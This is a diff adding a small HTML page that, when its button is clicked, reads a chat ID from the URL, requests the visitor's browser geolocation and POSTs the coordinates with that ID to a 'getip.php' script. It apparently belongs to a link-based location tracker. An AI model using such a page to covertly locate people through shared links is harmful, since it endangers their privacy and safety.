@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPS Permission</title>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+<button onclick="requestLocation()">Get Location</button>
+
+<script>
+function getQueryParam(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
+
+function requestLocation() {
+    const chatid = getQueryParam('id');
+
+    if (!chatid) {
+        alert('Chat ID not found in the URL.');
+        return;
+    }
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => showPosition(position, chatid));
+    } else {
+        alert("Geolocation is not supported by this browser.");
+    }
+}
+
+function showPosition(position, chatid) {
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+
+    // Send latitude, longitude, and chatid to PHP script
+    $.ajax({
+        type: 'POST',
+        url: 'getip.php',
+        data: { latitude: latitude, longitude: longitude, chatid: chatid },
+        success: function(response) {
+            alert('Location sent to server!');
+        }
+    });
+}
+</script>
+
+</body>
+</html>
